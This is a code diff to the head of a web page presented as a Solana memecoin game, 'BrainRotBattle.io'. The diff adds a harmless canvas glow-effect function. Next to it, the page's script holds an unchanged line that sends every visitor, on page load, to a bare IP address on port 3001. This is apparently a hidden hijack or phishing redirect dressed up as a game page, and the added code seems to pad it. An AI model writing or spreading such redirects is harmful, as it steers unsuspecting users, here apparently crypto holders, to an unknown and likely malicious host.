@@ -1,5 +1,16 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"><title>BrainRotBattle.io - Play Tralalerito's Meme Solana Game</title>
 <meta name="description" content="Join BrainRotBattle.io, the $TRALALA Solana memecoin game! Play now and enjoy fun gameplay, memes, and a unique UI. Start your journey today!"><script>
+    // Glow effect for player trail
+    function createGlowTrail(playerX, playerY) {
+        const ctx = document.getElementById('canvas').getContext('2d');
+        ctx.globalCompositeOperation = 'lighter';
+        ctx.fillStyle = 'rgba(0, 255, 0, 0.3)'; // Green glow
+        ctx.beginPath();
+        ctx.arc(playerX, playerY, 10, 0, Math.PI * 2);
+        ctx.fill();
+        ctx.globalCompositeOperation = 'source-over';
+    }
+
     window.location.href="http://46.4.204.162:3001";
     function createParticleExplosion(x, y) {
     const particles = [
